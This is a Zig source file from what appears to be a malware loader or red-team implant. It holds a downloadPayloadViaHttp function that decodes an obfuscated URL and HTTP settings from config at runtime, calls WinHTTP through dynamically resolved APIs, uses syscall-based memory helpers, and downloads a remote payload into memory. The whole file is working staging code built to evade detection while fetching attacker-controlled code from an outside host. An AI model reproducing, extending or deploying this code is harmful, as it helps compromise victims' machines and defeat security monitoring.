const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const mem = @import("helper/mem.zig");
const deobfsBytes = @import("helper/obfs.zig").deobfsBytes;
const string = @import("helper/string.zig");
const win32 = @import("win32.zig");

pub const HttpResult = struct {
    data: []u8,
    size: usize,
};

pub fn downloadPayloadViaHttp(apis: Apis, syscalls: Syscalls) !HttpResult {
    // Deobfuscate strings
    const http_url = deobfsBytes(config.http_url_obfs.len, config.http_url_obfs, config.obfs_key);
    const http_url_slice = http_url[0..];

    const http_useragent = deobfsBytes(config.http_useragent_obfs.len, config.http_useragent_obfs, config.obfs_key);
    const http_useragent_slice = http_useragent[0..];
    const http_useragentW = try string.utf8ToUtf16Z(syscalls, http_useragent_slice);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(http_useragentW.ptr))[0..http_useragentW.len * 2]);

    const http_method = deobfsBytes(config.http_method_obfs.len, config.http_method_obfs, config.obfs_key);
    const http_method_slice = http_method[0..];
    const http_methodW = try string.utf8ToUtf16Z(syscalls, http_method_slice);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(http_methodW.ptr))[0..http_methodW.len * 2]);

    const http_headers = deobfsBytes(config.http_headers_obfs.len, config.http_headers_obfs, config.obfs_key);
    const http_headers_slice = http_headers[0..];
    const http_headersW = try string.utf8ToUtf16Z(syscalls, http_headers_slice);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(http_headersW.ptr))[0..http_headersW.len * 2]);

    const http_data = deobfsBytes(config.http_data_obfs.len, config.http_data_obfs, config.obfs_key);
    const http_data_slice = http_data[0..];
    const http_dataW = try string.utf8ToUtf16Z(syscalls, http_data_slice);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(http_dataW.ptr))[0..http_dataW.len * 2]);

    const str_https = deobfsBytes(config.str_https_obfs.len, config.str_https_obfs, config.obfs_key);

    // Parse URL
    const uri = try std.Uri.parse(http_url_slice);
    // Convert UTF8 to UTF16 + '\0'
    const urlW = try string.utf8ToUtf16Z(syscalls, http_url_slice);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(urlW.ptr))[0..urlW.len * 2]);
    const hostW = try string.utf8ToUtf16Z(syscalls, uri.host.?.raw);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(hostW.ptr))[0..hostW.len * 2]);
    const pathW = try string.utf8ToUtf16Z(syscalls, uri.path.raw);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(pathW.ptr))[0..pathW.len * 2]);

    const str_https_slice = str_https[0..];
    const port: u16 = uri.port orelse if (std.mem.eql(u8, uri.scheme, str_https_slice)) 443 else 80;


    const h_session = apis.WinHttpOpen.?(
        @ptrCast(http_useragentW),
        win32.WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        null, null, 0,
    );
    if (h_session == null) return error.WinHttpOpenFailed;
    defer _ = apis.WinHttpCloseHandle.?(h_session);

    const h_connect = apis.WinHttpConnect.?(h_session, @ptrCast(hostW), port, 0);
    if (h_connect == null) return error.WinHttpConnectFailed;
    defer _ = apis.WinHttpCloseHandle.?(h_connect);
    
    var flags: windows.DWORD = 0;
    if (std.mem.eql(u8, uri.scheme, str_https_slice)) {
        flags = win32.WINHTTP_FLAG_SECURE;
    }

    const h_request = apis.WinHttpOpenRequest.?(
        h_connect,
        @ptrCast(http_methodW),
        @ptrCast(pathW),
        null, null, null, flags,
    );
    if (h_request == null) return error.WinHttpOpenRequestFailed;
    defer _ = apis.WinHttpCloseHandle.?(h_request);

    const custom_headersW: ?windows.LPCWSTR = if (http_headersW.len == 0) null else @ptrCast(http_headersW);
    const custom_headersW_len: windows.DWORD = if (http_headersW.len == 0) 0 else @intCast(http_headersW.len - 1);
    const opt_dataW: ?windows.LPVOID = if (http_dataW.len == 0) null else @ptrCast(http_dataW.ptr);
    const opt_dataW_len: windows.DWORD = if (http_dataW.len == 0) 0 else @intCast(http_dataW.len - 1);

    const res_send = apis.WinHttpSendRequest.?(
        h_request,
        custom_headersW,
        custom_headersW_len,
        opt_dataW,
        opt_dataW_len,
        opt_dataW_len,
        0,
    );
    if (res_send == windows.FALSE) return error.WinHttpSendRequestFailed;

    if (apis.WinHttpReceiveResponse.?(h_request, null) == windows.FALSE) {
        return error.WinHttpReceiveResponseFailed;
    }

    // Read the response data
    var buffer = try mem.DynamicBuffer.init(syscalls, 4096);
    defer buffer.deinit();

    var read_size: windows.DWORD = 0;
    var available_size: windows.DWORD = 0;

    var data_size: usize = 0;

    while (true) {
        if (apis.WinHttpQueryDataAvailable.?(h_request, &available_size) == windows.FALSE) {
            return error.WinHttpQueryDataAvailableFailed;
        }

        if (available_size == 0) break;

        try buffer.ensureCapacity(buffer.len + available_size);
        const read_buf = buffer.data[buffer.len..buffer.len + available_size];

        if (apis.WinHttpReadData.?(
            h_request,
            read_buf.ptr,
            available_size,
            &read_size,
        ) == windows.FALSE) {
            return error.WinHttpReadDataFailed;
        }

        buffer.len += read_size;
        data_size += read_size;
    }

    return HttpResult{ .data = buffer.toOwnedSlice(), .size = data_size };
}